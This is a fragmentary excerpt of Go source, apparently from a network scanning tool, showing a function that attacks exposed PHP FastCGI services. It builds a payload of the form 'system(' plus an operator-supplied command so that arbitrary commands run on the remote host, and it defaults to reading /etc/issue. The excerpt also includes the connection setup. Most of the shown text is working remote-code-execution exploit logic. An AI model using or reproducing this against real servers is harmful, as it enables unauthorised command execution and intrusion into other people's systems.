...
func FcgiScan(info *common2.HostInfo) {
	if common2.IsBrute {
		return
	}
	url := "/etc/issue"
	...
	switch {
	case common2.Command == "read":
		reqParams = ""
	case common2.Command != "":
		reqParams = "<?php system('" + common2.Command + "');die('" + cutLine + "');?>"
	default:
	...
	fcgi, err := New(addr, common2.Timeout)
	defer func() {
		if fcgi.rwc != nil {
			fcgi.rwc.Close()
		}
...
func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := common2.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
